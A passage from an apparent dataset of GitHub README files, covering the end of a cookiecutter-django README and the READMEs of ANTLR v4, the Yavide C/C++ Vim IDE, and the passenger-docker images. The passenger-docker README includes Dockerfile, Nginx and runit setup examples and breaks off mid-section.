_Cookiecutter: http:\/\/cookiecutter-django.readthedocs.io\/en\/latest\/index.html\n\nBasic Commands\n--------------\n\nTest coverage\n^^^^^^^^^^^^^\n\nTo run the tests, check your test coverage, and generate a simplified coverage report::\n\n    $ pytest\n\nTo generate an HTML report::\n\n    $ coverage html\n    $ open htmlcov\/index.html\n\nTo check the report in console::\n\n    $ coverage report -m\n\nSentry\n^^^^^^\n\nSentry is an error logging aggregator service. You can `sign up`_ for a free account  or download and host it yourself.\nThe system is setup with reasonable defaults, including 404 logging and integration with the WSGI application.\n\n.. _`sign up`: https:\/\/sentry.io\/signup\/?code=cookiecutter\n\nYou must set the DSN url in production.\n\n\nDeployment\n----------\n\nThe following details how to deploy this application.\n\n\nHeroku\n^^^^^^\n\nSee detailed `cookiecutter-django Heroku documentation`_.\n\n.. _`cookiecutter-django Heroku documentation`: http:\/\/cookiecutter-django.readthedocs.io\/en\/latest\/deployment-on-heroku.html\n\n\nDocker\n^^^^^^\n\nSee detailed `cookiecutter-django Docker documentation`_.\n\n.. _`cookiecutter-django Docker documentation`: http:\/\/cookiecutter-django.readthedocs.io\/en\/latest\/deployment-with-docker.html\n"},{"repo":"\/antlr\/antlr4","language":"Java","readme_contents":"# ANTLR v4\n\n[![Build Travis-CI Status](https:\/\/travis-ci.org\/antlr\/antlr4.svg?branch=master)](https:\/\/travis-ci.org\/antlr\/antlr4) [![Build AppVeyor  Status](https:\/\/ci.appveyor.com\/api\/projects\/status\/5acpbx1pg7bhgh8v\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/parrt\/antlr4) [![Java 7+](https:\/\/img.shields.io\/badge\/java-7+-4c7e9f.svg)](http:\/\/java.oracle.com) [![License](https:\/\/img.shields.io\/badge\/license-BSD-blue.svg)](https:\/\/raw.githubusercontent.com\/antlr\/antlr4\/master\/LICENSE.txt)\n\n**ANTLR** (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface (or visitor) that makes it easy to respond to the recognition of phrases of interest.\n\n*Given day-job constraints, my time working on this project is limited so I'll have to focus first on fixing bugs rather than changing\/improving the feature set. Likely I'll do it in bursts every few months. Please do not be offended if your bug or pull request does not yield a response! --parrt*\n\n[![Donate](https:\/\/www.paypal.com\/en_US\/i\/btn\/x-click-butcc-donate.gif)](https:\/\/www.paypal.com\/cgi-bin\/webscr?cmd=_s-xclick&hosted_button_id=BF92STRXT8F8Q)\n\n## Authors and major contributors\n\n* [Terence Parr](http:\/\/www.cs.usfca.edu\/~parrt\/), parrt@cs.usfca.edu\nANTLR project lead and supreme dictator for life\n[University of San Francisco](http:\/\/www.usfca.edu\/)\n* [Sam Harwell](http:\/\/tunnelvisionlabs.com\/) (Tool co-author, Java and C# target)\n* Eric Vergnaud (Javascript, Python2, Python3 targets and significant work on C# target)\n* [Peter Boyer](https:\/\/github.com\/pboyer) (Go target)\n* [Mike Lischke](http:\/\/www.soft-gems.net\/) (C++ completed target)\n* Dan McLaughlin (C++ initial target)\n* David Sisson (C++ initial target and test)\n* [Janyou](https:\/\/github.com\/janyou) (Swift target)\n* [Ewan Mellor](https:\/\/github.com\/ewanmellor), [Hanzhou Shi](https:\/\/github.com\/hanjoes) (Swift target merging)\n* [Ben Hamilton](https:\/\/github.com\/bhamiltoncx) (Full Unicode support in serialized ATN and all languages' runtimes for code points > U+FFFF)\n* [Marcos Passos](https:\/\/github.com\/marcospassos) (PHP target)\n\n## Useful information\n\n* [Release notes](https:\/\/github.com\/antlr\/antlr4\/releases)\n* [Getting started with v4](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/getting-started.md)\n* [Official site](http:\/\/www.antlr.org\/)\n* [Documentation](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/index.md)\n* [FAQ](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/faq\/index.md)\n* [ANTLR code generation targets](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/targets.md)<br>(Currently: Java, C#, Python2|3, JavaScript, Go, C++, Swift)\n* [Java API](http:\/\/www.antlr.org\/api\/Java\/index.html)\n* [ANTLR v3](http:\/\/www.antlr3.org\/)\n* [v3 to v4 Migration, differences](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/faq\/general.md)\n\nYou might also find the following pages useful, particularly if you want to mess around with the various target languages.\n \n* [How to build ANTLR itself](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/building-antlr.md)\n* [How we create and deploy an ANTLR release](https:\/\/github.com\/antlr\/antlr4\/blob\/master\/doc\/releasing-antlr.md)\n\n## The Definitive ANTLR 4 Reference\n\nProgrammers run into parsing problems all the time. Whether it\u2019s a data format like JSON, a network protocol like SMTP, a server configuration file for Apache, a PostScript\/PDF file, or a simple spreadsheet macro language\u2014ANTLR v4 and this book will demystify the process. ANTLR v4 has been rewritten from scratch to make it easier than ever to build parsers and the language applications built on top. This completely rewritten new edition of the bestselling Definitive ANTLR Reference shows you how to take advantage of these new features.\n\nYou can buy the book [The Definitive ANTLR 4 Reference](http:\/\/amzn.com\/1934356999) at amazon or an [electronic version at the publisher's site](https:\/\/pragprog.com\/book\/tpantlr2\/the-definitive-antlr-4-reference).\n\nYou will find the [Book source code](http:\/\/pragprog.com\/titles\/tpantlr2\/source_code) useful.\n\n## Additional grammars\n[This repository](https:\/\/github.com\/antlr\/grammars-v4) is a collection of grammars without actions where the\nroot directory name is the all-lowercase name of the language parsed\nby the grammar. For example, java, cpp, csharp, c, etc...\n"},{"repo":"\/JBakamovic\/yavide","language":"Shell","readme_contents":"# All development activities have been moved to [cxxd](https:\/\/github.com\/JBakamovic\/cxxd) and [cxxd-vim](https:\/\/github.com\/JBakamovic\/cxxd-vim) repositories. To keep up with the latest developments it is encouraged to use [cxxd-vim](https:\/\/github.com\/JBakamovic\/cxxd-vim) plugin. See first section of [FAQ](#faq) for more details.\n\n# Contents\n* [Changes](#changes)\n* [Installation](#installation)\n* [Usage](#usage)\n* [Screenshots](#screenshots)\n* [Features](#features)\n* [Credits](#credits)\n* [FAQ](#faq)\n\n# Changes\n* 13th of July, 2018\n    * Core functionality has been extracted to separate repositories:\n        * [cxxd](https:\/\/github.com\/JBakamovic\/cxxd), an implementation of C\/C++ language server\n        * [cxxd-vim](https:\/\/github.com\/JBakamovic\/cxxd-vim), a Vim frontend developed for `cxxd`\n    * `Yavide` will include those as dependencies and will continue to function normally but\n      **all development activity and focus is now moved to those projects** so in order to get\n      more features and stability please start using them directly from your ordinary Vim config.\n* 2nd of December, 2017\n    * Implemented Clang-based [indexer](docs\/services_framework.md#indexing)\n    * Implemented Clang-based [find-all-references](docs\/services_framework.md#find-all-references)\n    * Implemented Clang-based [go-to-definition](docs\/services_framework.md#go-to-definition)\n    * Implemented Clang-based [go-to-include](docs\/services_framework.md#go-to-include)\n    * Implemented support for [clang-tidy](docs\/services_framework.md#clang-tidy)\n    * Implemented support for [JSON compilation databases](docs\/services_framework.md#json-compilation-database)\n    * Implemented translation-unit caching mechanisms\n    * Various bugfixes and other smaller improvements\n* 12th of February, 2017\n    * Implemented [type deduction](docs\/services_framework.md#type-deduction) service.\n        * A mouse cursor hover over source code will give details about the underlying constructs (i.e. data types, function signatures, etc.).\n* 10th of February, 2017\n    * Implemented Clang-based [fixits & diagnostics](docs\/services_framework.md#fixits-and-diagnostics) service.\n    * Implemented mechanism which enables sharing the same AST within multiple services:\n        * E.g. Once the AST is built, semantic syntax highlighting and Clang fixits services\n          will be able to share the same AST.\n        * This will be especially important when more heavy-weight Clang-based services will\n          come into play, such as indexer and auto-completion engine.\n    * Refactored server-side code to decouple editor-specific integrations from the core implementation of services.\n* 19th of January, 2017\n    * Polished some rough edges around syntax highlighting:\n        * Implemented support for handling a set of overloaded functions or function templates (CursorKind.OVERLOADED_DECL_REF expressions)\n        * Implemented support for handling dependent types (TypeKind.DEPENDENT expressions)\n        * Implemented non-intrusive patch for clang.cindex enabling more flexible AST traversal\n* 28th of December, 2016\n    * Implemented Clang-based source code [syntax highlighting](docs\/services_framework.md#syntax-highlighting) service\n      (run `cd <yavide_install_dir>\/colors\/yaflandia && git pull` to get required colorscheme changes)\n* 1st of July, 2016\n    * Implemented new generic client-server (async) [framework](docs\/services_framework.md#framework) which enables dispatching any kind of operations to run in a separate \n      non-blocking background processes (so called [services](docs\/services_framework.md#services)) and upon whose completion results can be reported back to the server ('Yavide').\n    * Implemented 4 new services on top of the new async framework:\n        * On-the-fly source code [syntax highlighting](docs\/services_framework.md#syntax-highlighting) service.\n        * On-the-fly source code [indexing](docs\/services_framework.md#indexing) service.\n        * Clang-based source code [auto-formatting](docs\/services_framework.md#auto-formatting) service.\n        * [Project builder](docs\/services_framework.md#project-builder) service.\n\n# Installation\nSee [Installation guide](docs\/INSTALL.md).\n\n# Usage\nSee [Usage](docs\/usage.md).\n\n# Screenshots\n![Yavide](https:\/\/raw.githubusercontent.com\/wiki\/JBakamovic\/yavide\/images\/yavide_in_action.png)\n\nSee [some GIFs in action](docs\/services_framework.md).\n\n[More details ...](https:\/\/github.com\/JBakamovic\/yavide\/wiki\/Screenshots#how-it-looks-like)\n\n# Features\n* Bundled and tweaked for C\/C++ development\n* Project management\n  * Create new projects or import existing code base into the new workspace\n* Project explorer\n  * Explore the project using a tree-view widget\n* Project builder\n  * Trigger your builds within the environment to run non-intrusively in background\n* Class browser\n  * Featuring an overview of symbols defined in current unit (i.e. macro, struct, class, method, namespace, etc.)\n* Source code auto-completion\n  * Backed by real C\/C++ compiler back-end to ensure total correctness\n* Source code navigation\n  * Featuring a fully automated tag generation system which keeps the symbol database up-to-date\n* Source code syntax highlighting based on `libclang`\n  * Providing more rich syntax highlighting support than the one provided originally by `Vim`\n* Source code auto-formatting\n  * `clang-formatter` support\n* Source code static analysis\n  * `Cppcheck` support\n* Source code management client integration\n  * Featuring integration of `Git` client\n* Many more miscellaneous features like:\n  * Parenthesis auto-complete\n  * Context-aware ordinary text auto-complete\n  * Multiple-selection editing support\n  * Code snippets\n  * Color schemes support\n\n# Credits\nThis is an alphabetically ordered list of third-party Vim plugins currently utilized in the system:\n* A (https:\/\/github.com\/vim-scripts\/a.vim)\n* Clang_complete (https:\/\/github.com\/Rip-Rip\/clang_complete)\n* NERDCommenter (https:\/\/github.com\/scrooloose\/nerdcommenter)\n* NERDTree (https:\/\/github.com\/scrooloose\/nerdtree)\n* SuperTab (https:\/\/github.com\/ervandew\/supertab)\n* Tagbar (https:\/\/github.com\/majutsushi\/tagbar)\n* UltiSnips (https:\/\/github.com\/SirVer\/ultisnips)\n* vim-airline (https:\/\/github.com\/bling\/vim-airline)\n* vim-autoclose (https:\/\/github.com\/Townk\/vim-autoclose)\n* vim-fugitive (https:\/\/github.com\/tpope\/vim-fugitive)\n* vim-gitgutter (https:\/\/github.com\/airblade\/vim-gitgutter)\n* vim-multiple-cursors (https:\/\/github.com\/terryma\/vim-multiple-cursors)\n* vim-pathogen (https:\/\/github.com\/tpope\/vim-pathogen)\n\n# FAQ\n## Why development focus has been moved to [cxxd](https:\/\/github.com\/JBakamovic\/cxxd) and [cxxd-vim](https:\/\/github.com\/JBakamovic\/cxxd-vim)?\nTL;DR Having separated one big monolithic `Yavide` repository into two separate ones (`cxxd` & `cxxd-vim`) brought us more modular, reusable, testable and flexible design. There are many many other advantages to this approach for all of them to be noted down here briefly but the important part now is that the frontend logic (e.g. UI implementation) is now separated from the backend implementation (C\/C++ language server features). Both of these developments can now be driven separately and in parallel. Furthermore, `cxxd-vim` behaves like a real Vim plugin so you won't need to use hacky install scripts anymore but a regular way of installing just like for any other Vim plugin out there (e.g. Vundle). For many other details please have a look at respective repositories.\n\n## Other questions\nSee [FAQ](docs\/FAQ.md).\n\n"},{"repo":"\/phusion\/passenger-docker","language":"Shell","readme_contents":"# Docker base images for Ruby, Python, Node.js and Meteor web apps\n\n<img src=\"http:\/\/blog.phusion.nl\/content\/images\/2018\/03\/passenger-docker.jpg\" width=\"500\" alt=\"Docker\">\n\nPassenger-docker is a set of [Docker](https:\/\/www.docker.com) images meant to serve as good bases for **Ruby, Python, Node.js and Meteor** web app images. In line with [Phusion Passenger](https:\/\/www.phusionpassenger.com\/)'s goal, passenger-docker's goal is to make Docker image building for web apps much easier and faster.\n\nWhy is this image called \"passenger\"? It's to represent the ease: you just have to sit back and watch most of the heavy lifting being done for you. Passenger-docker is part of a larger and more ambitious project: to make web app deployment ridiculously simple, to heights never achieved before.\n\n**Relevant links:**\n [Github](https:\/\/github.com\/phusion\/passenger-docker) |\n [Docker registry](https:\/\/registry.hub.docker.com\/u\/phusion\/passenger-full\/) |\n [Discussion forum](https:\/\/groups.google.com\/d\/forum\/passenger-docker) |\n [Twitter](https:\/\/twitter.com\/phusion_nl) |\n [Blog](http:\/\/blog.phusion.nl\/)\n\n---------------------------------------\n\n**Table of contents**\n\n * [Why use passenger-docker?](#why_use)\n * [About passenger-docker](#about)\n   * [What's included?](#whats_included)\n   * [Memory efficiency](#memory_efficiency)\n   * [Image variants](#image_variants)\n * [Inspecting the image](#inspecting_the_image)\n * [Using the image as base](#using)\n   * [Getting started](#getting_started)\n   * [The `app` user](#app_user)\n   * [Using Nginx and Passenger](#nginx_passenger)\n     * [Adding your web app to the image](#adding_web_app)\n     * [Configuring Nginx](#configuring_nginx)\n     * [Setting environment variables in Nginx](#nginx_env_vars)\n     * [Application environment name (`RAILS_ENV`, `NODE_ENV`, etc)](#app_env_name)\n   * [Using Redis](#redis)\n   * [Using memcached](#memcached)\n   * [Additional daemons](#additional_daemons)\n   * [Using Ruby](#using_ruby)\n     * [Selecting a default Ruby version](#selecting_default_ruby)\n     * [Running a command with a specific Ruby version](#running_command_with_specific_ruby_version)\n     * [Default wrapper scripts](default_ruby_wrapper_scripts)\n   * [Running scripts during container startup](#running_startup_scripts)\n   * [Upgrading the operating system inside the container](#upgrading_os)\n   * [Upgrading Passenger to the latest version](#upgrading_passenger)\n * [Container administration](#container_administration)\n   * [Running a one-shot command in a new container](#oneshot)\n   * [Running a command in an existing, running container](#run_inside_existing_container)\n   * [Login to the container via `docker exec`](#login_docker_exec)\n     * [Usage](#docker_exec)\n   * [Login to the container via SSH](#login_ssh)\n     * [Enabling SSH](#enabling_ssh)\n     * [About SSH keys](#ssh_keys)\n     * [Using the insecure key for one container only](#using_the_insecure_key_for_one_container_only)\n     * [Enabling the insecure key permanently](#enabling_the_insecure_key_permanently)\n     * [Using your own key](#using_your_own_key)\n     * [The `docker-ssh` tool](#docker_ssh)\n   * [Inspecting the status of your web app](#inspecting_web_app_status)\n   * [Logs](#logs)\n * [Switching to Phusion Passenger Enterprise](#enterprise)\n * [Building the image yourself](#building)\n * [FAQ](#faq)\n   * [Why are you using RVM? Why not rbenv or chruby?](#why_rvm)\n * [Contributing](#contributing)\n * [Conclusion](#conclusion)\n\n---------------------------------------\n\n<a name=\"why_use\"><\/a>\n## Why use passenger-docker?\n\nWhy use passenger-docker instead of doing everything yourself in Dockerfile?\n\n * Your Dockerfile can be smaller.\n * It reduces the time needed to write a correct Dockerfile. You won't have to worry about the base system and the stack, you can focus on just your app.\n * It sets up the base system **correctly**. It's very easy to get the base system wrong, but this image does everything correctly. [Learn more.](https:\/\/github.com\/phusion\/baseimage-docker#contents)\n * It drastically reduces the time needed to run `docker build`, allowing you to iterate your Dockerfile more quickly.\n * It reduces download time during redeploys. Docker only needs to download the base image once: during the first deploy. On every subsequent deploys, only the changes you make on top of the base image are downloaded.\n\n<a name=\"about\"><\/a>\n## About the image\n\n<a name=\"whats_included\"><\/a>\n### What's included?\n\n*Passenger-docker is built on top of a solid base: [baseimage-docker](http:\/\/phusion.github.io\/baseimage-docker\/).*\n\nBasics (learn more at [baseimage-docker](http:\/\/phusion.github.io\/baseimage-docker\/)):\n\n * Ubuntu 18.04 LTS as base system.\n * A **correct** init process ([learn more](http:\/\/blog.phusion.nl\/2015\/01\/20\/docker-and-the-pid-1-zombie-reaping-problem\/)).\n * Fixes APT incompatibilities with Docker.\n * syslog-ng.\n * The cron daemon.\n * [Runit](http:\/\/smarden.org\/runit\/) for service supervision and management.\n\nLanguage support:\n\n * Ruby 2.3.8, 2.4.9, 2.5.7 and 2.6.5; JRuby 9.2.0.0.\n   * RVM is used to manage Ruby versions. [Why RVM?](#why_rvm)\n   * 2.6.5 is configured as the default.\n   * JRuby is installed from source, but we register an APT entry for it.\n   * JRuby uses OpenJDK 8.\n * Python 2.7 and Python 3.6.\n * Node.js 10.\n * A build system, git, and development headers for many popular libraries, so that the most popular Ruby, Python and Node.js native extensions can be compiled without problems.\n\nWeb server and application server:\n\n * Nginx 1.14. Disabled by default.\n * [Phusion Passenger 5](https:\/\/www.phusionpassenger.com\/). Disabled by default (because it starts along with Nginx).\n   * This is a fast and lightweight tool for simplifying web application integration into Nginx.\n   * It adds many production-grade features, such as process monitoring, administration and status inspection.\n   * It replaces (G)Unicorn, Thin, Puma, uWSGI.\n   * Node.js users: [watch this 4 minute intro video](http:\/\/vimeo.com\/phusionnl\/review\/84945384\/73fe7432ee) to learn why it's cool and useful.\n\nAuxiliary services and tools:\n\n * Redis 4.0. Not installed by default.\n * Memcached. Not installed by default.\n\n<a name=\"memory_efficiency\"><\/a>\n### Memory efficiency\n\nPassenger-docker is very lightweight on memory. In its default configuration, it only uses 10 MB of memory (the memory consumed by bash, runit, syslog-ng, etc).\n\n<a name=\"image_variants\"><\/a>\n### Image variants\n\nPassenger-docker consists of several images, each one tailor made for a specific user group.\n\n**Ruby images**\n\n * `phusion\/passenger-ruby23` - Ruby 2.3.\n * `phusion\/passenger-ruby24` - Ruby 2.4.\n * `phusion\/passenger-ruby25` - Ruby 2.5.\n * `phusion\/passenger-ruby26` - Ruby 2.6.\n * `phusion\/passenger-jruby92` - JRuby 9.2.\n\n**Node.js and Meteor images**\n\n * `phusion\/passenger-nodejs` - Node.js 10.\n\n**Other images**\n\n * `phusion\/passenger-full` - Contains everything in the above images. Ruby, Python, Node.js, all in a single image for your convenience.\n * `phusion\/passenger-customizable` - Contains only the base system, as described in [\"What's included?\"](#whats_included). Ruby, Python and Node.js are not preinstalled. This image is meant to be further customized through your Dockerfile. For example, using this image you can create a custom image that contains only Ruby 2.4, Ruby 2.5 and Node.js.\n\nIn the rest of this document we're going to assume that the reader will be using `phusion\/passenger-full`, unless otherwise stated. Simply substitute the name if you wish to use another image.\n\n<a name=\"inspecting_the_image\"><\/a>\n## Inspecting the image\n\nTo look around in the image, run:\n\n    docker run --rm -t -i phusion\/passenger-full bash -l\n\nYou don't have to download anything manually. The above command will automatically pull the passenger-docker image from the Docker registry.\n\n<a name=\"using\"><\/a>\n## Using the image as base\n\n<a name=\"getting_started\"><\/a>\n### Getting started\n\nThere are several images, e.g. `phusion\/passenger-ruby26` and `phusion\/passenger-nodejs`. Choose the one you want. See [Image variants](#image_variants).\n\nSo put the following in your Dockerfile:\n\n```dockerfile\n# Use phusion\/passenger-full as base image. To make your builds reproducible, make\n# sure you lock down to a specific version, not to `latest`!\n# See https:\/\/github.com\/phusion\/passenger-docker\/blob\/master\/Changelog.md for\n# a list of version numbers.\nFROM phusion\/passenger-full:<VERSION>\n# Or, instead of the 'full' variant, use one of these:\n#FROM phusion\/passenger-ruby23:<VERSION>\n#FROM phusion\/passenger-ruby24:<VERSION>\n#FROM phusion\/passenger-ruby25:<VERSION>\n#FROM phusion\/passenger-ruby26:<VERSION>\n#FROM phusion\/passenger-jruby92:<VERSION>\n#FROM phusion\/passenger-nodejs:<VERSION>\n#FROM phusion\/passenger-customizable:<VERSION>\n\n# Set correct environment variables.\nENV HOME \/root\n\n# Use baseimage-docker's init process.\nCMD [\"\/sbin\/my_init\"]\n\n# If you're using the 'customizable' variant, you need to explicitly opt-in\n# for features.\n#\n# N.B. these images are based on https:\/\/github.com\/phusion\/baseimage-docker,\n# so anything it provides is also automatically on board in the images below\n# (e.g. older versions of Ruby, Node, Python).\n#\n# Uncomment the features you want:\n#\n#   Ruby support\n#RUN \/pd_build\/ruby-2.3.*.sh\n#RUN \/pd_build\/ruby-2.4.*.sh\n#RUN \/pd_build\/ruby-2.5.*.sh\n#RUN \/pd_build\/ruby-2.6.*.sh\n#RUN \/pd_build\/jruby-9.2.*.sh\n#   Python support.\n#RUN \/pd_build\/python.sh\n#   Node.js and Meteor standalone support.\n#   (not needed if you already have the above Ruby support)\n#RUN \/pd_build\/nodejs.sh\n\n# ...put your own build instructions here...\n\n# Clean up APT when done.\nRUN apt-get clean && rm -rf \/var\/lib\/apt\/lists\/* \/tmp\/* \/var\/tmp\/*\n```\n\n<a name=\"app_user\"><\/a>\n### The `app` user\n\nThe image has an `app` user with UID 9999 and home directory `\/home\/app`. Your application is supposed to run as this user. Even though Docker itself provides some isolation from the host OS, running applications without root privileges is good security practice.\n\nYour application should be placed inside \/home\/app.\n\nNote: when copying your application, make sure to set the ownership of the application directory to `app` by calling `COPY --chown=app:app \/local\/path\/of\/your\/app \/home\/app\/webapp`\n\n<a name=\"nginx_passenger\"><\/a>\n### Using Nginx and Passenger\n\nBefore using Passenger, you should familiarise yourself with it by [reading its documentation](https:\/\/www.phusionpassenger.com).\n\nNginx and Passenger are disabled by default. Enable them like so:\n\n```dockerfile\nRUN rm -f \/etc\/service\/nginx\/down\n```\n\n<a name=\"adding_web_app\"><\/a>\n#### Adding your web app to the image\n\nPassenger works like a `mod_ruby`, `mod_nodejs`, etc. It changes Nginx into an application server and runs your app from Nginx. So to get your web app up and running, you just have to add a virtual host entry to Nginx which describes where you app is, and Passenger will take care of the rest.\n\nYou can add a virtual host entry (`server` block) by placing a .conf file in the directory `\/etc\/nginx\/sites-enabled`. For example:\n\n# \/etc\/nginx\/sites-enabled\/webapp.conf:\n```nginx\nserver {\n    listen 80;\n    server_name www.webapp.com;\n    root \/home\/app\/webapp\/public;\n\n    # The following deploys your Ruby\/Python\/Node.js\/Meteor app on Passenger.\n\n    # Not familiar with Passenger, and used (G)Unicorn\/Thin\/Puma\/pure Node before?\n    # Yes, this is all you need to deploy on Passenger! All the reverse proxying,\n    # socket setup, process management, etc are all taken care automatically for\n    # you! Learn more at https:\/\/www.phusionpassenger.com\/.\n    passenger_enabled on;\n    passenger_user app;\n\n    # If this is a Ruby app, specify a Ruby version:\n    # For Ruby 2.6\n    passenger_ruby \/usr\/bin\/ruby2.6;\n    # For Ruby 2.5\n    passenger_ruby \/usr\/bin\/ruby2.5;\n    # For Ruby 2.4\n    passenger_ruby \/usr\/bin\/ruby2.4;\n    # For Ruby 2.3\n    passenger_ruby \/usr\/bin\/ruby2.3;\n}\n```\n\n# Dockerfile:\n```dockerfile\nRUN rm \/etc\/nginx\/sites-enabled\/default\nADD webapp.conf \/etc\/nginx\/sites-enabled\/webapp.conf\nRUN mkdir \/home\/app\/webapp\nRUN ...commands to place your web app in \/home\/app\/webapp...\n# This copies your web app with the correct ownership.\n# COPY --chown=app:app \/local\/path\/of\/your\/app \/home\/app\/webapp\n```\n\n<a name=\"configuring_nginx\"><\/a>\n#### Configuring Nginx\n\nThe best way to configure Nginx is by adding .conf files to `\/etc\/nginx\/main.d` and `\/etc\/nginx\/conf.d`. Files in `main.d` are included into the Nginx configuration's main context, while files in `conf.d` are included in the Nginx configuration's http context.\n\nFor example:\n\n    # \/etc\/nginx\/main.d\/secret_key.conf:\n    env SECRET_KEY=123456;\n\n    # \/etc\/nginx\/conf.d\/gzip_max.conf:\n    gzip_comp_level 9;\n\n    # Dockerfile:\n    ADD secret_key.conf \/etc\/nginx\/main.d\/secret_key.conf\n    ADD gzip_max.conf \/etc\/nginx\/conf.d\/gzip_max.conf\n\n<a name=\"nginx_env_vars\"><\/a>\n#### Setting environment variables in Nginx\n\nBy default Nginx [clears all environment variables](http:\/\/nginx.org\/en\/docs\/ngx_core_module.html#env) (except `TZ`) for its child processes (Passenger being one of them). That's why any environment variables you set with `docker run -e`, Docker linking and `\/etc\/container_environment`, won't reach Nginx.\n\nTo preserve these variables, place an Nginx config file ending with `*.conf` in the directory `\/etc\/nginx\/main.d`, in which you tell Nginx to preserve these variables. For example when linking a PostgreSQL container or MongoDB container:\n\n    # \/etc\/nginx\/main.d\/postgres-env.conf:\n    env POSTGRES_PORT_5432_TCP_ADDR;\n    env POSTGRES_PORT_5432_TCP_PORT;\n\n    # Dockerfile:\n    ADD postgres-env.conf \/etc\/nginx\/main.d\/postgres-env.conf\n\nBy default, passenger-docker already contains a config file `\/etc\/nginx\/main.d\/default.conf` which preserves the `PATH` environment variable.\n\n<a name=\"app_env_name\"><\/a>\n#### Application environment name (`RAILS_ENV`, `NODE_ENV`, etc)\n\nSome web frameworks adjust their behavior according to the value some environment variables. For example, Rails respects `RAILS_ENV` while Connect.js respects `NODE_ENV`. By default, Phusion Passenger sets all of the following environment variables to the value **production**:\n\n * `RAILS_ENV`\n * `RACK_ENV`\n * `WSGI_ENV`\n * `NODE_ENV`\n * `PASSENGER_APP_ENV`\n\nSetting these environment variables yourself (e.g. using `docker run -e RAILS_ENV=...`) will not have any effect, because Phusion Passenger overrides all of these environment variables. The only exception is `PASSENGER_APP_ENV` (see below).\n\nWith passenger-docker, there are two ways to set the aforementioned environment variables. The first is through the [`passenger_app_env`](https:\/\/www.phusionpassenger.com\/library\/config\/nginx\/reference\/#passenger_app_env) config option in Nginx. For example:\n\n```nginx\n# \/etc\/nginx\/sites-enabled\/webapp.conf:\nserver {\n    ...\n    # Ensures that RAILS_ENV, NODE_ENV, etc are set to \"staging\"\n    # when your application is started.\n    passenger_app_env staging;\n}\n```\n\nThe second way is by setting the `PASSENGER_APP_ENV` environment variable from `docker run`\n\n    docker run -e PASSENGER_APP_ENV=staging YOUR_IMAGE\n\nThis works because passenger-docker autogenerates an Nginx configuration file (`\/etc\/nginx\/conf.d\/00_app_env.conf`) during container boot. This file sets the `passenger_app_env` option in the `http` context. This means that if you already set `passenger_app_env` in the `server` context, running `docker run -e PASSENGER_APP_ENV=...` won't have any effect!\n\nIf you want to set a default value while still allowing that to be overridden by `docker run -e PASSENGER_APP_ENV=`, then instead of specifying `passenger_app_env` in your Nginx config file, you should create a `\/etc\/nginx\/conf.d\/00_app_env.conf`. This file will be overwritten if the user runs `docker run -e PASSENGER_APP_ENV=...`.\n\n```nginx\n# \/etc\/nginx\/conf.d\/00_app_env.conf\n# File will be overwritten if user runs the container with `-e PASSENGER_APP_ENV=...`!\npassenger_app_env staging;\n```\n\n<a name=\"redis\"><\/a>\n### Using Redis\n\n**Redis is only available in the passenger-customizable and passenger-full images!**\n\nInstall and enable Redis:\n\n```dockerfile\n# Opt-in for Redis if you're using the 'customizable' image.\n#RUN \/pd_build\/redis.sh\n\n# Enable the Redis service.\nRUN rm -f \/etc\/service\/redis\/down\n```\n\nThe configuration file is in \/etc\/redis\/redis.conf. Modify it as you see fit, but make sure `daemonize no` is set.\n\n<a name=\"memcached\"><\/a>\n### Using memcached\n\n**Memcached is only available in the passenger-customizable and passenger-full images!**\n\nInstall and enable memcached:\n\n```dockerfile\n# Opt-in for Memcached if you're using the 'customizable' image.\n#RUN \/pd_build\/memcached.sh\n\n# Enable the memcached service.\nRUN rm -f \/etc\/service\/memcached\/down\n```\n\nThe configuration file is in \/etc\/memcached.conf. Note that it does not follow the Debian\/Ubuntu format, but our own, in order to make it work well with runit. The default contents are:\n\n\n    # These arguments are passed to the memcached daemon.\n    MEMCACHED_OPTS=\"-l 127.0.0.1\"\n\n\n<a name=\"additional_daemons\"><\/a>\n### Additional daemons\n\nYou can add additional daemons to the image by creating runit entries. You only have to write a small shell script which runs your daemon, and runit will keep it up and running for you, restarting it when it crashes, etc.\n\nThe shell script must be called `run`, must be executable, and is to be placed in the directory `\/etc\/service\/<NAME>`.\n\nHere's an example showing you how to a memached server runit entry can be made.\n\n    ### In memcached.sh (make sure this file is chmod +x):\n    #!\/bin\/sh\n    # `setuser` is part of baseimage-docker. `setuser mecached xxx...` runs the given command\n    # (`xxx...`) as the user `memcache`. If you omit this, the command will be run as root.\n    exec \/sbin\/setuser memcache \/usr\/bin\/memcached >>\/var\/log\/memcached.log 2>&1\n\n    ### In Dockerfile:\n    RUN mkdir \/etc\/service\/memcached\n    ADD memcached.sh \/etc\/service\/memcached\/run\n\nNote that the shell script must run the daemon **without letting it daemonize\/fork it**. Usually, daemons provide a command line flag or a config file option for that.\n\n**Tip**: If you're thinking about running your web app, consider deploying it on Passenger instead of on runit. Passenger relieves you from even having to write a shell script, and adds all sorts of useful production features like process scaling, introspection, etc. These are not available when you're only using runit.\n\n<a name=\"using_ruby\"><\/a>\n### Using Ruby\n\nWe use [RVM](https:\/\/rvm.io\/) to install and to manage Ruby interpreters. Because of this there are some special considerations you need to know, particularly when you are using the `passenger-full` image which contains multiple Ruby versions installed in parallel. You can learn more about RVM at the RVM website, but this section will teach you its basic usage.\n\n<a name=\"selecting_default_ruby\"><\/a>\n#### Selecting a default Ruby version\n\nThe default Ruby (what the `\/usr\/bin\/ruby` command executes) is the latest Ruby version that you've chosen to install. You can use RVM select a different version as default.\n\n```dockerfile\n# Ruby 2.3.8\nRUN bash -lc 'rvm --default use ruby-2.3.8'\n# Ruby 2.4.9\nRUN bash -lc 'rvm --default use ruby-2.4.9'\n# Ruby 2.5.7\nRUN bash -lc 'rvm --default use ruby-2.5.7'\n# Ruby 2.6.5\nRUN bash -lc 'rvm --default use ruby-2.6.5'\n# JRuby 9.2.0.0\nRUN bash -lc 'rvm --default use jruby-9.2.0.0'\n```\n\nLearn more: [RVM: Setting the default Ruby](https:\/\/rvm.io\/rubies\/default).\n\n<a name=\"running_command_with_specific_ruby_version\"><\/a>\n#### Running a command with a specific Ruby 